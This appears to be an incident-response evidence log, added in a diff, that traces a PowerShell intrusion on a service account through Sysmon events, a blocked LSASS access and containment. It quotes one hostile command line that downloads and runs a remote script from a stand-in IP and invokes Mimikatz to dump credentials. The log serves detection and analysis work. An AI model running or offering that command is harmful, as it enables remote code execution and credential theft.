@@ -1,0 +1,35 @@
+SOC-003 — Evidence Log
+=======================
+
+[22:41:07] Wazuh rule 92501 triggered: PowerShell execution with hidden window
+           and no-profile flags from host IT-ADMIN-02.
+
+[22:41:07] Sysmon Event ID 1: powershell.exe (PID 8834) spawned by cmd.exe (PID 8801),
+           running under service account "svc_backup".
+           Command line:
+             powershell.exe -nop -w hidden -c "IEX (IWR http://198.51.100.23/inv.ps1
+             -UseBasicParsing); Invoke-Mimikatz -DumpCreds"
+
+[22:41:07] Anomaly: svc_backup is a non-interactive service account used only for
+           scheduled backup jobs (02:00 daily). An interactive-style PowerShell
+           invocation at 22:41 is outside all known/expected activity for this
+           account.
+
+[22:41:09] Sysmon Event ID 3: outbound connection to 198.51.100.23 over HTTP/80,
+           retrieving "inv.ps1".
+
+[22:41:15] Sysmon Event ID 10 (Process Access): powershell.exe (PID 8834) requested
+           access to lsass.exe (PID 712) with access mask consistent with credential
+           dumping (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION).
+
+[22:41:16] Windows Defender / EDR blocked the LSASS memory read attempt
+           (credential dumping protection triggered).
+
+[22:42:00] Account svc_backup disabled by on-call analyst as containment action.
+
+Logon session review:
+  Query of Event ID 4624 for svc_backup in the preceding 24h shows only
+  scheduled task logons (Logon Type 4) — no prior interactive logons (Type 2/10).
+  This session's logon type recorded as Type 3 (network) from IT-ADMIN-02,
+  suggesting the account's credentials were used remotely rather than
+  the account itself acting locally.
